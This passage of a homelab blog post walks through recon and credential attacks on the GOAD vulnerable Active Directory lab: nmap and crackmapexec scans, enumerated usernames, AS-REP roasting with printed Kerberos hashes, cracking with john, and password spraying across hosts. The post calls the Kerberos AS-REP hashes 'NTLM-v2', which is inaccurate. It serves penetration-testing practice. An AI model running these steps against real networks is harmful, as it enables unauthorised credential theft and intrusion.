+|   DNS_Domain_Name: essos.local
+|   DNS_Computer_Name: braavos.essos.local
+|   DNS_Tree_Name: essos.local
+|   Product_Version: 10.0.14393
+|_  System_Time: 2024-12-08T15:08:27+00:00
+| ssl-cert: Subject: commonName=braavos.essos.local
+| Not valid before: 2024-10-27T13:45:07
+|_Not valid after:  2025-04-28T13:45:07
+MAC Address: BC:24:11:25:64:C6 (Unknown)
+Device type: general purpose
+Running: Microsoft Windows 2016
+OS CPE: cpe:/o:microsoft:windows_server_2016
+OS details: Microsoft Windows Server 2016 build 10586 - 14393
+Network Distance: 1 hop
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 4h17m59s, deviation: 26m49s, median: 4h29m59s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: braavos
+|   NetBIOS computer name: BRAAVOS\x00
+|   Domain name: essos.local
+|   Forest name: essos.local
+|   FQDN: braavos.essos.local
+|_  System time: 2024-12-08T16:08:27+01:00
+| smb2-time: 
+|   date: 2024-12-08T15:08:27
+|_  start_date: 2024-12-08T10:09:55
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: BRAAVOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: bc:24:11:25:64:c6 (unknown)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.59 ms 172.16.100.23
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.84 seconds
+</code></pre></div></div>
+
+<h4 id="recon-with-crackmapexec">Recon with CrackmapExec:</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(root㉿kali)-[~/goad]
+└─# crackmapexec smb 172.16.100.1/24
+SMB         172.16.100.52   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
+SMB         172.16.100.50   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         172.16.100.51   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         172.16.100.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
+SMB         172.16.100.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
+</code></pre></div></div>
+
+<h4 id="modifying-the-etchosts-file-to-update-dns">Modifying the /etc/hosts file to update DNS</h4>
+
+<p>172.16.100.50   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
+172.16.100.51   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
+172.16.100.52   essos.local meereen.essos.local meereen
+172.16.100.22   castelblack.north.sevenkingdoms.local castelblack
+172.16.100.23   braavos.essos.local braavos</p>
+
+<h3 id="enumerating-with-enum4linux">Enumerating with <code class="language-plaintext highlighter-rouge">Enum4linux</code></h3>
+
+<p>Using Enum4linux against DC-02 <code class="language-plaintext highlighter-rouge">WINTERFELL</code> <code class="language-plaintext highlighter-rouge">north.sevenkingdoms.local</code> has given us a bunch of information, which contains usernames related to the specific domain.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>arya.stark 
+brandon.stark
+hodor
+jon.snow
+jeor.mormont
+rickon.stark
+samwell.tarly
+sansa.stark
+sql_svc
+</code></pre></div></div>
+
+<p>Passwords in description:</p>
+
+<p><img src="/assets/images/sample/GOAD/SCR-20241208-sltp.png" alt="SCR-20241208-sltp.png" /></p>
+
+<p>Username: [samwell.tarly] Samwell Tarly 
+Password: Heartsbane</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Okay so far we got the usernames and password of one user. I’m making all the users into one file <code class="language-plaintext highlighter-rouge">users.txt</code> and passwords into <code class="language-plaintext highlighter-rouge">passwords.txt</code>. This can be helpful in the later part of the enumerations.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>I tried to use the same username and password against the other machines in the network, but seems like there are two hosts that accepts this username and password.</p>
+
+<p><code class="language-plaintext highlighter-rouge">SMB         172.16.100.23   445    BRAAVOS          [+] essos.local\samwell.tarly:Heartsbane </code>
+<code class="language-plaintext highlighter-rouge">SMB         172.16.100.51   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane</code></p>
+
+<h3 id="time-to-roast">Time to Roast</h3>
+
+<p>Doing an AES-REP-Roast with the found username and password has yielded an NTLM-v2 hash for the user <code class="language-plaintext highlighter-rouge">brandon.stark</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# impacket-GetNPUsers -dc-ip 172.16.100.51 -request north.sevenkingdoms.local/samwell.tarly          
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+Name           MemberOf                                              PasswordLastSet             LastLogon                   UAC      
+-------------  ----------------------------------------------------  --------------------------  --------------------------  --------
+brandon.stark  CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2024-10-28 13:08:08.297524  2024-12-08 16:09:49.777220  0x410200 
+
+
+
+$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:0337620fe4ca6eea0a6eaf0203314f04$d7b5f362e906185ec1c7558c6df8de574aeeebd9107f730e1b2c0b8be5efa3f7a3777e16a1dadcf22724b67f1decef13f68c18077c72863c5109a05d6129ce3cf0c2be94b395f0b0d38076795cb00efae1fcc73e9390ca93ed5ba6d5bb684b163d6dccf23d9e936dc34a8e7ba726ba592e8b8a6ef0c71b4900d3539fa1a29efb465d11a6f1d8c82c010484d4ee0922fe895438dc9f7c88a9f042af4911f511d0f28f9cad09e5aff6afa22c2ca3c0cfcea1017887812d6eae1e68b89de4fd113338dbb11b06c7fe7a02a004578626f7e31be94e2d8c35abda940ea5641f52b8ac8ed6f39efafdf0ce67816723b185151c026325c7b2a893b73e3b42ae3f8fe0c69b067b754c06
+</code></pre></div></div>
+
+<p>Let’s also check in an other way if we are able to get the <code class="language-plaintext highlighter-rouge">ntlm-v2</code> hash with out using the username and password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>─# impacket-GetNPUsers -no-pass -usersfile users.txt north.sevenkingdoms.local/             
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:ab113a7e42221cb8d00c614e2f934ce5$66275013bc56e1da2081c09eca574e915efbff0f857fa6273700ff2db27d4713cb94da46c0f0a9e658a20945197e66d264a6337276125fa9792d7292bba5b6b89bf0abb915c4d8dda816476475446f4f61a7171c1f1f61037dd4b5c2a81aee356feb45df0cf9678628e72d8103a186609f70752d3cacfede9755a38ab8deac9b9258e13c1ea0ab4bfd4f259f513a2a28467e31b9f2a1b8ad3d8e1216d3a2c0dadcafef03a47b4849daee45dd3a6d3f475d7e3c027ef1dda7f59421aeb1b59381d27b4a604d40c2757a665cf77a3f7cfb870750ecc652f2f3fb507a206eb6dd8e16e108767399d333c7f05c013ffb853ee918d46da9ab66ff6100da37139d98d27a2a25b14a7e
+[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code></pre></div></div>
+
+<p>Using <code class="language-plaintext highlighter-rouge">hashcat</code> or <code class="language-plaintext highlighter-rouge">John</code> to crack the hash.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iseedeadpeople   ($krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL)     
+1g 0:00:00:00 DONE (2024-12-08 11:57) 16.66g/s 896000p/s 896000c/s 896000C/s 091803..ilovebrooke
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Username: brandon.stark</code>
+<code class="language-plaintext highlighter-rouge">Password: iseedeadpeople</code></p>
+
+<p>Checking with crackmapexec with what hosts can brandon.stark can access I found he can access 3 hosts in the network.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# crackmapexec smb 172.16.100.1/24 -u Brandon.stark -p iseedeadpeople        
+SMB         172.16.100.52   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
+SMB         172.16.100.51   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         172.16.100.50   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         172.16.100.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
+SMB         172.16.100.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
+SMB         172.16.100.52   445    MEEREEN          [-] essos.local\Brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE 
+SMB         172.16.100.103  445    COMMANDO         [*] Windows 10 / Server 2019 Build 19041 x64 (name:COMMANDO) (domain:commando) (signing:False) (SMBv1:False)
+SMB         172.16.100.51   445    WINTERFELL       [+] north.sevenkingdoms.local\Brandon.stark:iseedeadpeople 
+SMB         172.16.100.50   445    KINGSLANDING     [-] sevenkingdoms.local\Brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE 
+SMB         172.16.100.23   445    BRAAVOS          [+] essos.local\Brandon.stark:iseedeadpeople 
+SMB         172.16.100.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\Brandon.stark:iseedeadpeople 
+SMB         172.16.100.103  445    COMMANDO         [-] commando\Brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE 
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Note: I tried using evil-winrm with the cracked credentials to login into all the three machines but not success.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/images/sample/GOAD/Pasted image 20241208225806.png" alt="Pasted image 20241208225806.png" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#goad" class="page__taxonomy-item p-category" rel="tag">GOAD,</a><span class="sep">, </span>
+    
+      <a href="/tags/#homelab" class="page__taxonomy-item p-category" rel="tag">HomeLab</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#goad" class="page__taxonomy-item p-category" rel="tag">GOAD</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2024-12-07T00:00:00+05:30">December 7, 2024</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://twitter.com/intent/tweet?text=Game+of+Active+Directory+-+Part+2+%5BRecon%5D%20http%3A%2F%2Flocalhost%3A4000%2Fgoad%2FGOAD-p2%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fgoad%2FGOAD-p2%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/goad/GOAD-p2/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/goad/GOAD-p1/" class="pagination--pager" title="Game of Active Directory - Part 1 - [Basic]">Previous</a>
+    
+    
+      <a href="/goad/GOAD-p3/" class="pagination--pager" title="Game of Active Directory - Part 3 [Recon]">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/malleablec2.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/Malleable-c2-pro/" rel="permalink">Cobalt Strike Malleable C2 Profiles
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-25T00:00:00+05:30">December 25, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hide from blue team like a pro by using malleable c2 profiles.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/cs.webp" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/redirectors/" rel="permalink">Cobalt Strike Redirectors using Apache-SSL
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-19T00:00:00+05:30">December 19, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">This is how you setup single or multiple redirectors for Cobalt-Strike using malleable-c2 profiles and Apache SSL
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/RTIL.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/RED-TEAM-Infra/" rel="permalink">RED-TEAM Home-Lab Infra
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">How to Setup a Red-Teams infrastructure at Home
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/GOAD/goad-part3.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/goad/GOAD-p3/" rel="permalink">Game of Active Directory - Part 3 [Recon]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-14T00:00:00+05:30">December 14, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to pract...</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2025 <a href="https://dcodezero.github.io/">https://dcodezero.github.io/</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/goad/GOAD-p2/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/goad/GOAD-p2"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://dcode_zero.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+  </body>
+</html>
